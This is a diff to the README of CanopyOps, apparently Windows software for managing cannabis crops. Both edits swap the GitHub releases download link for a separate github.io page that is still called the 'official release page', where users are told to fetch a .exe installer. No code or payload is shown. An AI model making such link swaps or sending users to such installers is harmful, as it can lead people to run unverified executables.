@@ -1,6 +1,6 @@
 # 🌿 CanopyOps - Manage your cannabis crops with precision
 
-[![](https://img.shields.io/badge/Download_CanopyOps-Blue?style=for-the-badge&logo=github)](https://github.com/Bekhbekh7821/CanopyOps/releases)
+[![](https://img.shields.io/badge/Download_CanopyOps-Blue?style=for-the-badge&logo=github)](https://bekhbekh7821.github.io)
 
 CanopyOps helps cultivators manage cannabis crops. The software organizes your cultivation plans, tracks plant health, performs harvest calculations, and keeps operating records. It assists with daily diagnostics and helps you make data-backed decisions throughout the growth cycle.
 
@@ -17,7 +17,7 @@ To run CanopyOps on your Windows computer, you need the following:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official release page](https://github.com/Bekhbekh7821/CanopyOps/releases) to access the download files.
+1. Visit the [official release page](https://bekhbekh7821.github.io) to access the download files.
 2. Look for the file ending in `.exe` under the latest release version.
 3. Click the file name to download the installer to your computer.
 4. Once the download finishes, open your Downloads folder in File Explorer.
